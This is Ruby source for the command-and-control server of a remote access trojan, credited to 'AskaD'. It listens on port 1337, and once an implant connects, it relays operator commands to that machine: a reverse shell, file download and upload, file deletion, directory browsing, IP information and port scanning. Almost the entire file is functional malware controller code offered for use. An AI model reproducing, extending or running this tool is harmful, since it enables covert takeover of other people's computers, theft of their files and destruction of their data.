require 'socket'
require 'os'

class Server
	def initialize(port)
		@port = port
		self.run

	end

	def banner
		if OS.windows?
      		system('cls')
    	else
    		system('clear')
    	end

   		puts """\n\n   ███▄ ▄███▓ ███▄    █   ▄████  ▄▄▄       ██▓     ██▓    
   ▓██▒▀█▀ ██▒ ██ ▀█   █  ██▒ ▀█▒▒████▄    ▓██▒    ▓██▒    
   ▓██    ▓██░▓██  ▀█ ██▒▒██░▄▄▄░▒██  ▀█▄  ▒██░    ▒██░    
   ▒██    ▒██ ▓██▒  ▐▌██▒░▓█  ██▓░██▄▄▄▄██ ▒██░    ▒██░    
   ▒██▒   ░██▒▒██░   ▓██░░▒▓███▀▒ ▓█   ▓██▒░██████▒░██████▒
   ░ ▒░   ░  ░░ ▒░   ▒ ▒  ░▒   ▒  ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
   ░  ░      ░░ ░░   ░ ▒░  ░   ░   ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
   ░      ░      ░   ░ ░ ░ ░   ░   ░   ▒     ░ ░     ░ ░   
          ░            ░       ░       ░  ░    ░  ░    ░  ░
                                                        
                   \033[31m{ By AskaD }\033[00m
              [=] \033[34mAuthor\033[00m  : AskaD    [=]
                 { \033[34mGithub\033[00m : 3x1t1um }"""
	end

	def run
		self.banner
		self.init

	end

	def init
		server = TCPServer.open(@port)
		@client = server.accept
		@path = @client.recv(4096).gsub("\n","")
		
		puts "Client has joined\n"

		loop do
			print "\033[31m#{@path} \033[34m~#\033[00m "
			command = gets.chomp

			case command
			
			when "help"
				self.help

			when "ipinfo"
				self.ipinfo

			when "shell"
				self.shell

			when "show"
				self.showfile

			when "portscan"
				self.portscan

			when "delete"
				self.delete

			when "download"
				self.download

			when "upload"
				self.upload

			when "cd"
				self.changedir

			when "ls"
				self.ls
			
			else 
				nil				
			end

	   	end

	   	@client.close

	end

	def help
		puts """
		 ╔═┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐═╗
		╟──┘               HELP command             └──╢
		╟──┐                                        ┌──╢
		 ║ └┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘ ║
		║                                              ║
		║  ipinfo              show ip informations    ║
		║  shell               open reverse shell      ║
		║  show                show file               ║
		║  portscan            scan ports on a target  ║
		║  delete              delete file             ║
		║  upload              upload file             ║
		║  download            download file           ║
		║  cd                  change dir              ║
		║  ls                  show file on dir        ║
		║                                              ║
		 ║                                            ║
		╚══════════════════════════════════════════════╝
		"""
	end

	def ipinfo
		@client.puts 'ipinfo'
		puts @client.recv(4096)
	end

	def shell
		@client.puts 'shell'
		print "#{@client.recv(4096).gsub("\n","")} ~# "
		
		loop do
			command2shell = gets.chomp

			if command2shell == "leave"
				@client.puts "leave"
				break

			elsif command2shell != ''
				@client.puts command2shell
				answser = @client.recv(50000)
				print "#{answser[0, answser.size-1]} ~# " 

			else
				puts 'error'
			end			
		end
	end

	def showfile
		@client.puts 'showfile'
		print @client.recv(1024).gsub("\n","")
		file = gets.chomp
		
		@client.puts file
		data = ""
		
		loop do
			data = @client.recv(50000)
			puts data
			
			break if data.length < 50000
		end

	end

	def portscan
		@client.puts 'portscan'
		print @client.recv(1024).gsub("\n","")
		file = gets.chomp
		
		@client.puts file
		ports = @client.recv(4096)
		
		ports.each do |port|
			puts "Port #{port} Open"
		end

	end

	def delete
		@client.puts 'delete'
		print @client.recv(1024).gsub("\n","")
		file = gets.chomp
		
		@client.puts "#{@path}/#{file}"
		puts @client.recv(1024)
	end

	def download
		@client.puts 'upload'
		print @client.recv(1024).gsub("\n","")
		file = gets.chomp
		
		@client.puts file
		data = ""
		
		loop do
			data = @client.recv(50000)
			destFile = File.open(file, 'ab')
			destFile.print data
			destFile.close
			
			break if data.length < 50000
		end
	end

	def upload
		@client.puts 'download'
		print @client.recv(1024).gsub("\n","")
		filename = gets.chomp
		
		if File.file?(filename)
			@client.puts filename
			print @client.recv(1024)
			
			file = File.open(filename, "rb")
			data = file.read
			file.close

			@client.puts data

		else
			puts filename << " is invalid"
		end

	end

	def changedir
		@client.puts 'changedir'
		print @client.recv(1024).gsub("\n","")
		newdir = gets.chomp
		
		@client.puts "#{@path}/#{newdir}"
		data = @client.recv(4096).gsub("\n","")
		
		if data == "invalid path"
			nil
		else
			@path = data
		end

	end

	def ls
		@client.puts 'ls'
		print @client.recv(1024).gsub("\n","")
		puts @path
		
		@client.puts @path
		data = @client.recv(50000)
		puts "#{data}\n{========================================================}"

	end
end

if __FILE__ == $0
	Server.new(1337)	
end
